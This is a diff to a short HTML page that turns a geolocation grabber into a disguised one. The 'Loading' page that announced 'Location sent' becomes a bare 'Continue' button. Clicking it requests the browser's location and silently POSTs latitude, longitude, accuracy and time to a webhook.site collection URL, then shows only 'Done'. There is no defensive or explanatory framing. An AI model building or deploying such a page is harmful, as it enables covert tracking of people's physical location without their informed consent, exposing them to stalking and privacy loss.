@@ -2,33 +2,37 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Loading</title>
+  <title>Continue</title>
 </head>
 <body>
-  <p>Loading...</p>
 
-  <script>
-    navigator.geolocation.getCurrentPosition(
-      function(pos) {
-        fetch("https://webhook.site/4fe24142-54cb-425b-bcf2-efbd3566d252", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            time: new Date().toISOString()
-          })
-        });
+<button id="btn">Continue</button>
 
-        alert("Location sent");
-      },
-      function() {
-        document.body.innerHTML = "Permission denied";
-      }
-    );
-  </script>
+<script>
+document.getElementById("btn").onclick = function () {
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      fetch("https://webhook.site/4fe24142-54cb-425b-bcf2-efbd3566d252", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          time: new Date().toISOString()
+        })
+      });
+
+      document.body.innerHTML = "Done";
+    },
+    function(err) {
+      document.body.innerHTML = "Denied";
+    }
+  );
+};
+</script>
+
 </body>
 </html>
